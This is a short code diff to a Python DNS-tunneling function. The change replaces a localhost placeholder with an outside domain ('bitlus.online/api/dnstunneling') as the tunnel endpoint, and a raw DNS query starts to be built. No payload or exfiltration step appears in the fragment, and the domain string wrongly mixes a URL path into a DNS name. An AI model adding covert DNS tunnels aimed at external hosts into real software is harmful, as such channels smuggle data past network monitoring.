@@ -1,7 +1,7 @@
 import socket
 
 def dns_tunneling_request(subdomain, dns_server="8.8.8.8"):
-    domain = f"{subdomain}.127.0.0.1/api/dnstunneling"  # Replace with your target domain
+    domain = f"{subdomain}.bitlus.online/api/dnstunneling"  # Replace with your target domain
 
     # Build the DNS query
     transaction_id = b"\xaa\xaa"  # Transaction ID
